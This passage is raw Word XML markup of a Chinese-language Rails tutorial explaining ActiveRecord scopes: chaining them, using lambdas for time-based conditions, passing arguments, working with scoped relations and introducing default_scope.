        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6475880D" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18F0F775" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F520969" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :published, where(:published</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="393FED0B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BF13863" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>就像之前的一样，这些方法也是可以级联的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7704"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="18711015" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="400CE364" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="497C3A5C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :publiced, where(:published</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true).joins(:category)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD7BCC1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4482B28C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>作用域里面可以包含其它作用域：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2C314537" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6508722F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1011604D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :published, where(:published</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05A81AAE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :published_and_commented, published.and(self.arel_table[:comments_count].gt(0))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D143B3D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79390F57" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">我们可以在类里面调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>published</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 这个作用域：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="50020115" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D0E7DEF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="279528342"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.published # =&gt; [published posted]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77F05280" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">我们也可以在一个包含 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 对象的 association 里面调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1661FED9" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5999EA77" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>category = Category.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00C4BBB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>category.posts.published # =&gt; [published posts belonging to this category]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="487A9A7B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>14.1 包含时间的计算</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22854940" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>如果你在作用域里面包含日期或者时间，你必需使用 lambda 来保证它们每次都重新计算。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="623707DF" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E57CEE6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39A945AA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :created_before_now, lambda { where("created_at &lt; ?", Time.zone.now) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DE26B31" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7435E461" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果不使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lambda</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.zone.now</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 将只调用一次。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52874C6E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>14.2 传递参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8C0715" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">当在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 里面使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lambda</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时，它可以带参数：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2E6D1EDB" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35F8726B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="174A38C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  scope :created_before, lambda { |time| where("created_at &lt; ?", time) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15711631" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B459538" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它可以这样调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1CED1C63" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="277A6122" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="675958420"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.created_before(Time.zone.now)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4F66BCEF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>然而，这只是相当于实现了一个类方法的功能。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4656"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="44169FBA" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="336AF4CB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="293DCCAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.created_before(time)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42E16315" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    where("created_at &lt; ?", time)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BA307DA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18710D44" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32FA7AFD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>类方法是给作用域传递参数的一个更好的方式。这些方法依然可以被 association 对象调用：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7A76E464" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E4CFC46" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="460809755"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>category.posts.created_before(time)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3E24BDCC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>14.3 使用作用域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2292237D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">当你需要一个 relation 实例对象时， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>scoped</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法就派上用场了。它会返回一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Relation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 对象，并且这个对象可以继续调用其它作用域。另外， association 也会用到作用域。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4B8343AF" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B6826DC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.find_by_first_name("Ryan")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45A7A575" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders = client.orders.scoped</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05C863AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">对于这个新的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>orders</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 对象，我们可以断定它可以继续调用其它的作用域。比如说，如果我们希望在之后的调用点上返回最近 30 天的 order 记录。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="091521F2" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73A481D1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="495993422"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.where("created_at &gt; ?", 30.days.ago)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0AC3ED80" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>14.4 定义默认的作用域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197AFDE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果我们希望定义一个 model 里面所有的查询都会执行的作用域，那我们可以在 model 里面使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>default_scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
